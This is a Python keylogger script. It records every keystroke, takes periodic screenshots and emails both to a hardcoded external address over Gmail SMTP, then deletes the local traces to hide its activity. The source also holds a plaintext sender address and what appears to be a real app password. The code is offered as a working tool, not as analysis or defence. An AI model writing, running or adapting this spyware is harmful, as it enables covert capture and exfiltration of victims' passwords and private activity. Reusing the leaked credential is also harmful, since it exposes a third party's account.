import os
import threading
import time
import smtplib
import ssl
import multiprocessing
import pyscreenshot as ImageGrab
from pynput import keyboard
from pynput.keyboard import Key,Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage

reciver_email_address="thivankanimesh@hotmail.com"
mailling_time_gap=50
screen_shots_time_gap=10
mouse_click_events=False
screen_shots=False
web_records=False
web_cam=False
delete_log_file=False

sender_email_address="thivankanimshan@gmail.com"
sender_email_password="jmpomhnpxzcvtfyr"
last_mail_sent_time=time.time()
last_screenshot_taken_time=time.time()
port = 587

class Screenshot(threading.Thread):

        def __init__(self):
                threading.Thread.__init__(self)
      
        def takeScreenshot(self):
                global last_screenshot_taken_time
                print("in ss")
                #Make directories
                if not os.path.exists('./img'):
                        os.mkdir('img')

                if(time.time()-last_screenshot_taken_time>=screen_shots_time_gap):
                        print("screenshot taken")
                        lenth=len(os.listdir('./img'))
                        im = ImageGrab.grab()
                        im.save(str.format('./img/img{0}.png',lenth))
                        last_screenshot_taken_time=time.time()

        def run(self):
                print("screenshot thread startted")

class KeyLogger(threading.Thread):

        keys = []
        overall_count=0

        def __init__(self):
                threading.Thread.__init__(self)

        def write_file(self,key):
                self.keys.append(key)
                self.overall_count+=1
                if(self.overall_count%10==0):
                        file=open('log.txt','a')   
                        for key in self.keys:
                                file.write(str(key))
                        file.write("\n")
                        self.keys = []

class Mail(threading.Thread):

        global port

        smtp=smtplib.SMTP('smtp.gmail.com',port)

        def __init__(self):

                threading.Thread.__init__(self)
                #Connect to SMTP
                self.smtp.ehlo()
                self.smtp.starttls()
                self.smtp.ehlo()

                self.smtp.login(sender_email_address,sender_email_password)

        def sendMail(self):

                global last_mail_sent_time
                file='log.txt'

                msg=MIMEMultipart()
                msg['Subject']='subject'
                msg['From']=sender_email_address
                msg['To']=reciver_email_address

                if((time.time()-last_mail_sent_time)>=mailling_time_gap):

                        #Making keylogs attachment
                        keylogs_attachment=MIMEBase('application','octet-stream')
                        keylogs_attachment.set_payload(open(file,'rb').read())
                        keylogs_attachment.add_header('Content-Disposition','attachment; filename="%s"'%os.path.basename(file))
                        msg.attach(MIMEText("Labour"))
                        msg.attach(keylogs_attachment)
                        #Errace file
                        os.remove('log.txt')

                        #Making screenshots attachment
                        for image in os.listdir('./img'):
                                screen_shots_attachment=MIMEImage(open(str.format('./img/{0}',image),'rb').read())
                                msg.attach(screen_shots_attachment)
                        #errace screenshot directory(./img)
                        for image in os.listdir('./img'):
                                os.remove(str.format('./img/{0}',image))

                        #sending mail
                        self.smtp.sendmail(sender_email_address,reciver_email_address,msg.as_string())

                        #Updating message sent time
                        last_mail_sent_time=time.time()
                        #DEBUGGIN
                        print("email is sent")

class System(threading.Thread):

        keylogger=KeyLogger()
        screenshot=Screenshot()
        mail=Mail()

        def __init__(self):
                threading.Thread.__init__(self)

        if __name__ == '__main__':

                print("if condition")

                mail.start()
                screenshot.start()
                keylogger.start()
                
                mail.join()
                screenshot.join()
                keylogger.join()

                print('if __name__ == ')
        
        def runnn(self,key):

                print("test")
                print(key)

                self.screenshot.takeScreenshot()                
                self.keylogger.write_file(key)
                self.mail.sendMail()
            
sys=System()
sys.start()
sys.join()

def on_press(key):
        sys.runnn(key)
    
def on_release(key):
        if(key==Key.esc):
                return False  

listener= keyboard.Listener(on_press=on_press,on_release=on_release)
if __name__ == '__main__':
        listener.start()
        listener.join()
    